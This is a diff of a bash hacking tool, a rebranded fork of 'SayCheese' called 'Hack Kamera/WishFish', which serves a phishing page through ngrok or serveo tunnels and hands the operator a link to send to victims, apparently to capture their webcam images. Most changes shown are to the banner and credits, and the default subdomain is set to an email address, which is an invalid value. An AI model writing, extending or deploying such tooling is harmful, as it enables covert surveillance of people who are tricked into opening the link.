@@ -1,29 +1,24 @@
 #!/bin/bash
-# SayCheese v1.0
-# coded by: github.com/thelinuxchoice/saycheese
-# If you use any part from this code, giving me the credits. Read the Lincense!
+# Inspired by: github.com/thelinuxchoice/saycheese
+# Modified by: github.com/mukegile-id/SadapKamera
 
 trap 'printf "\n";stop' 2
 
 banner() {
 
-printf "\e[1;91m  _    _  _______   _         _   _______  ______    _______ \e[0m\n"
-printf "\e[1;91m | | / / | | _ | | | \      /| | | |____| | _____|  | | _ | | \e[0m\n"
-printf "\e[1;91m | |/ /  | |(_)| | | |\    / | | | |      | |(_) |  | |(_)| | \e[0m\n"
-printf "\e[1;91m | / /   | |•••| | | | \  /  | | | |____  | \____|  | |•••| | \e[0m\n"
-printf "\e[1;77m | \ \   | |•••| | | |  \/   | | | |____| | |\ \    | |•••| | \e[0m\n"
-printf "\e[1;77m | |\ \  | |   | | | |       | | | |____  | | \ \   | |   | | \e[0m\n"
-printf "\e[1;77m |_| \_\ |_|   |_| |_|       |_| |_|____| |_|  \_\  |_|   |_| \e[0m\n"
+echo -e "\033[31m __          _ _     _     \e[0m ______ _     _          ";
+echo -e "\033[31m \ \        / (_)   | |    \e[0m|  ____(_)   | |         ";
+echo -e "\033[31m  \ \  /\  / / _ ___| | __ \e[0m| |__   _ ___| |__       ";
+echo -e "\033[31m   \ \/  \/ / | / __| '_  |\e[0m|  __| | / __| '_ \      ";
+echo -e "\033[31m    \  /\  /  | \__ \ | | |\e[0m| |    | \__ \ | | |     ";
+echo -e "\033[31m     \/  \/   |_|___/_| |_|\e[0m|_|    |_|___/_| |_| v2.0";
 
-printf " \e[1;77m Hack Kamera V.1 Coded By MUKEGILE.ID\e[0m \n"
-
-printf "\n"
-
+printf "\e[1;77m Website :- www.defacer.id \e[0m \n"
+printf "\e[1;77m V.1 Coded By github.com/mukegile-id \e[0m \n"
 
 }
 
 stop() {
-
 checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
 checkphp=$(ps aux | grep -o "php" | head -n1)
 checkssh=$(ps aux | grep -o "ssh" | head -n1)
@@ -31,7 +26,6 @@ if [[ $checkngrok == *'ngrok'* ]]; then
 pkill -f -2 ngrok > /dev/null 2>&1
 killall -2 ngrok > /dev/null 2>&1
 fi
-
 if [[ $checkphp == *'php'* ]]; then
 killall -2 php > /dev/null 2>&1
 fi
@@ -117,7 +111,6 @@ send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
 printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link
 
 }
-
 
 payload_ngrok() {
 
@@ -219,7 +212,7 @@ sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 start() {
 
 default_choose_sub="Y"
-default_subdomain="mukegile-id$RANDOM"
+default_subdomain="mukegile.id@gmail.com$RANDOM"
 
 printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
 read choose_sub
@@ -240,4 +233,3 @@ checkfound
 banner
 dependencies
 start1
-
